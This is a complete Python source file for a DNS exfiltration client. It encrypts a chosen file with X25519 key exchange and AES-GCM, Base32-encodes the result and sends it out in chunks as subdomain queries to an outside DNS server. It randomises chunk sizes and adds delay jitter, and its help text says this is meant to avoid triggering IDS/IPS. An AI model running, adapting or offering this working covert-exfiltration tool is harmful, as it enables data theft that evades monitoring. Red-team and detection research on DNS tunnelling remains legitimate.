#!/usr/bin/env python3
"""
Module Name: client.py

Description:
    DNS exfiltration client using X25519 key exchange, AES-GCM encryption,
    Base32 encoding, and HMAC for integrity.

    - Derives a per-transfer AES key and HMAC key via ECDH (X25519 + HKDF).
    - Encrypts file with AES-GCM, appends HMAC tag, then Base32-encodes.
    - Splits Base32 string into DNS-safe chunks and sends as subdomains.

Author: John Burns
Date: 2025-05-02
Version: 2.2 (Refactored for clarity)
"""

import argparse
import base64
import hashlib
import hmac
import logging
import math
import os
import random
import socket
import sys
import time
from uuid import uuid4

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from dnslib import DNSRecord, DNSQuestion, QTYPE
from dotenv import load_dotenv, find_dotenv

# Setup
load_dotenv(find_dotenv())
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('client')

# Constants
MAX_RETRIES = 3
DNS_IP = '192.0.2.1'


def load_server_public_key(path):
    """
    Load X25519 server public key from raw file.
    """
    with open(path, 'rb') as f:
        data = f.read()
    return x25519.X25519PublicKey.from_public_bytes(data)


def derive_shared_keys(client_priv, server_pub):
    """
    Perform ECDH and derive AES-GCM key and HMAC key.
    Returns (aes_key, hmac_key).
    """
    shared = client_priv.exchange(server_pub)
    material = HKDF(algorithm=hashes.SHA256(), length=48, salt=None, info=b'dns-exfil').derive(shared)
    return material[:32], material[32:]


def encrypt_and_hmac(file_path, aes_key, hmac_key):
    """
    Read file, encrypt with AES-GCM, append HMAC-SHA256 tag.
    Returns raw bytes.
    """
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=None)

    tag = hmac.new(hmac_key, nonce + ciphertext, hashlib.sha256).digest()
    return nonce + ciphertext + tag


def base32_encode(data):
    """
    Base32-encode and strip padding.
    """
    b32 = base64.b32encode(data).decode('ascii')
    return b32.rstrip('=')


def chunk_payload(b32_string, identifier, *, min_size=16, max_label_len=52):
    """
    Split Base32 string into DNS-safe subdomain labels of the form
      <identifier>-<idx>-<total>-<chunk>
    with each label <= max_label_len characters and chunk lengths randomized
    between min_size and the per-label maximum.
    """

    # Estimate total segments if we used min_size chunks,
    # so we know how many digits “total” will consume.
    est_segments = max(1, math.ceil(len(b32_string) / min_size))
    tot_digits = len(str(est_segments))

    segments = []
    pos = 0
    idx = 0

    # First pass: carve out all the data‐chunks
    while pos < len(b32_string):
        idx_digits = len(str(idx))
        # overhead = len(id) + digits(idx) + digits(total) + 3 hyphens
        overhead = len(identifier) + idx_digits + tot_digits + 3
        available = max_label_len - overhead
        if available < min_size:
            raise ValueError(f"max_label_len={max_label_len} too small for min_size={min_size}")
        # pick a random size in [min_size, available]
        size = random.randint(min_size, available)
        segments.append(b32_string[pos:pos + size])
        pos += size
        idx += 1

    total = len(segments)

    # Second pass: yield the properly formatted labels
    for idx, seg in enumerate(segments):
        yield f"{identifier}-{idx}-{total}-{seg}"


# def chunk_payload(b32_string, identifier, domain):
#     """
#     Split Base32 string into DNS-safe subdomains.
#     """
#     max_label = 63 - (len(identifier) + len(domain) + 2)
#     segments = [b32_string[i:i + max_label] for i in range(0, len(b32_string), max_label)]
#     total = len(segments)
#     for idx, seg in enumerate(segments):
#         yield f"{identifier}-{idx}-{total}-{seg}"


def send_query(subdomain, args):
    """
    Send a single DNS A query.
    Returns True on success.
    """
    fqdn = f"{subdomain}.{args.domain}"
    q = DNSRecord(q=DNSQuestion(fqdn, QTYPE.A))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        sock.sendto(q.pack(), (args.server_ip, args.server_port))
        resp, _ = sock.recvfrom(512)
        logger.debug(f"Response: {DNSRecord.parse(resp)}")
        return True
    except Exception as e:
        logger.warning(f"Query failed for {subdomain}: {e}")
        return False
    finally:
        sock.close()


def reliable_send(subdomain, args):
    """
    Attempt to send DNS query with retries.
    """
    for attempt in range(1, MAX_RETRIES + 1):
        if send_query(subdomain, args):
            logger.info(f"Sent {subdomain} successfully")
            return True
        logger.info(f"Retry {attempt} for {subdomain}")
    return False


def perform_key_exchange(identifier, args):
    """
    Generate ephemeral keypair, send public in chunks, derive shared keys.
    Returns (aes_key, hmac_key).
    """
    server_pub = x25519.X25519PublicKey.from_public_bytes(args.server_pubkey)
    # load_server_public_key(args.server_pubkey)
    client_priv = x25519.X25519PrivateKey.generate()
    pub_bytes = client_priv.public_key().public_bytes(encoding=serialization.Encoding.Raw,
                                                      format=serialization.PublicFormat.Raw)
    b32_pub = base32_encode(pub_bytes)
    # split into 50-char fragments
    parts = [b32_pub[i:i + 50] for i in range(0, len(b32_pub), 50)]
    for frag in parts:
        sub = f"{identifier}-0-0-{frag}"
        reliable_send(sub, args)
    return derive_shared_keys(client_priv, server_pub)


def fetch_server_pubkey(domain):
    q = DNSRecord.question(f"public.{domain}", 'TXT')
    a = q.send(dest=args.server_ip, port=args.server_port, timeout=2)
    txt = str(DNSRecord.parse(a).get_a().rdata).strip('"')
    pad_len = (8 - len(txt) % 8) % 8
    txt = str(txt) + "=" * pad_len  # add padding
    print(txt)
    # Or just take the first TXT string:
    return base64.b32decode(txt)  # add padding if needed


def main(args):
    identifier = uuid4().hex[:8]
    # Key exchange
    aes_key, hmac_key = perform_key_exchange(identifier, args)
    logger.info(f"Keys established for session {identifier}")

    # Encrypt, HMAC, Base32
    raw_blob = encrypt_and_hmac(args.file_path, aes_key, hmac_key)
    b32 = base32_encode(raw_blob)
    logger.debug(f"Base32 length: {len(b32)}")

    # Send data chunks
    failures = []
    for sub in chunk_payload(b32, identifier):
        time.sleep(random.uniform(args.low, args.high) / 1000.0)
        if not reliable_send(sub, args):
            failures.append(sub)

    if failures:
        logger.error(f"Failed chunks: {failures}")
        sys.exit(1)
    logger.info("All chunks sent successfully")


def parse_args():
    p = argparse.ArgumentParser(description="DNS Exfiltration Client (ECDH + AES-GCM + HMAC)")
    p.add_argument('--server-ip', default='127.0.0.1')
    p.add_argument('--server-port', type=int, default=5300)
    p.add_argument('--file-path', required=True)
    p.add_argument('--domain', default='xf.example.com')
    p.add_argument('--low', type=int, default=500,
                   help='Reducing the minimum delay below 500ms may trigger IDS/IPS, rate limiting, or other actions to protect dns servers.')
    p.add_argument('--high', type=int, default=1000,
                   help='Should be adjusted to maintain a QPS of 1-2 queries per second.')

    return p.parse_args()


if __name__ == '__main__':
    args = parse_args()
    args.server_pubkey = fetch_server_pubkey(args.domain)
    main(args)
